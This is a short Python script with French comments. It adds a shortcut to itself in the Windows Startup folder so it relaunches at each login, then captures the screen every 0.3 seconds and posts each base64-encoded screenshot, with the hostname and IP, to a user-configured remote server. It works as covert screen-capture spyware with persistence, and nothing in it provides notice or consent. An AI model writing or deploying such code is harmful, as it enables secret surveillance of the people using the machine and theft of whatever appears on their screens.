import requests, socket, time
import pyautogui
from io import BytesIO
import base64
import os
import shutil
import sys

# Emplacement du script à lancer au démarrage
script_path = os.path.abspath(sys.argv[0])

# Raccourci à créer dans le dossier Startup
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
shortcut_path = os.path.join(startup_folder, 'MonScript.lnk')

# Création du raccourci (nécessite le module `pywin32`)
import win32com.client
shell = win32com.client.Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut(shortcut_path)
shortcut.Targetpath = script_path
shortcut.WorkingDirectory = os.path.dirname(script_path)
shortcut.IconLocation = script_path
shortcut.save()


SERVER_URL = "http://YOUR IPV4 ADRESSE !!!!!:5051/screen"  # 👉 à adapter selon l'adresse du serveur

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

while True:
    try:
        # Capture de l’écran
        screenshot = pyautogui.screenshot()
        buffer = BytesIO()
        screenshot.save(buffer, format="JPEG")
        img_base64 = base64.b64encode(buffer.getvalue()).decode("utf-8")

        # Envoi au serveur Flask
        payload = {
            "hostname": hostname,
            "ip": ip,
            "image": img_base64
        }
        requests.post(SERVER_URL, json=payload, timeout=2)

    except Exception as e:
        print("Erreur lors de la capture ou de l'envoi :", e)

    time.sleep(0.3)  # ⚠️ intervalle de 0.3 secondes

